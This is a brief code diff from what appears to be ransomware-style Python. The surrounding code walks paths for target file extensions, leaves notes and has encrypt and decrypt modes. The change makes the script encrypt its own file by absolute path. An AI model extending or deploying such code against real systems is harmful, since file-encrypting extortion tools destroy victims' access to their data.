@@ -62,7 +62,7 @@ def main():
                     threads.remove(t)
 
         leave_notes(note, paths)
-        sanctuary.encrypt_file(sys.argv[0])
+        sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
 
     elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:
         file_array = recursive_walk(paths, target_extensions, 2)
